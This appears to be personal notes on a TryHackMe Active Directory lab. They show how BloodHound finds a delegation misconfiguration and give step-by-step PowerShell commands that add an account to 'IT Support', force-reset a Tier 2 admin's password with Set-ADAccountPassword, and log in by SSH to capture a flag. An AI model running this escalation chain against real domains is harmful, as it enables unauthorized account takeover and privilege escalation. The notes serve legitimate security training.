---
title: Find and Exploit Path to Tier 2 Admins
updated: 2023-04-23T22:18:46.0000000+04:00
created: 2023-04-23T21:29:31.0000000+04:00
---

Find and Exploit Path to Tier 2 Admins
Sunday, April 23, 2023
9:29 PM

1.  Find Path to Tier 2 Admins

Do as follows:

Add your user account as the start position and the Tier 2 Admins group as the end position.

![image1](image1-122.png)

### Bloodhound shows us a very interesting path.

1.  It seems that there was a slight bit of Permission Delegation in this domain.
2.  An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE.
3.  This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group.
4.  Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members.
5.  This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration.

Let's exploit it!

## Exploiting Path to Tier 2 Admins.

### Step 1: Add current AD account to IT Support Group

- Add-ADGroupMember PowerShell cmdlet from the AD-RSAT toolset
- Start PowerShell (either in RDP or via SSH) on the THMJMP1 host and run the following command to add your account:

| Command | Powershell -ep bypass |
|---------|-----------------------|

![image2](image2-60.png)

![image3](image3-42.png)

### Step 2: use the following command to add the desired user to the IT Support Group

| Command | Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username" |
|---------|--------------------------------------------------------------------|

### Step 3: Verify the user was added to IT Support

| Command | Get-ADGroupMember -Identity "IT Support" |
|---------|------------------------------------------|

![image4](image4-29.png)

### Step 4: Force Change Password:

Now that we are a member of the IT Support group, we have inherited the ForceChangePassword Permission Delegation over the Tier 2 Admins group.

First, we need to identify the members of this group to select a target.

#### *use the Get-ADGroupMember cmdlet again to assist with this:*

| Command | Get-AdGroupMember -Identity "Tier 2 Admins" |
|---------|---------------------------------------------|

![image5](image5-19.png)

Optional: Adding to a Text file.

![image6](image6-12.png)

### Step 5: Using Set-ADAccountPassword to Force Change Password:

We will use the Set-ADAccountPassword AD-RSAT cmdlet to force change the password:

| Command | \$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force                |
|---------|------------------------------------------------------------------------------------------------|
| Command | Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword \$Password |

![image7](image7-9.png)

### Step 6: Testing newly changed credentials for the Tier 2 Admin User:

- Log into SSH

| Command | Ssh za\\\t2_melanie.davies@thmwrk1.za.tryhackme.loc |
|---------|-----------------------------------------------------|

#### *After Entering New Password, we Successfully Login*

![image8](image8-8.png)

Step 7: Finding the Flag on the Administrator Desktop

![image9](image9-5.png)

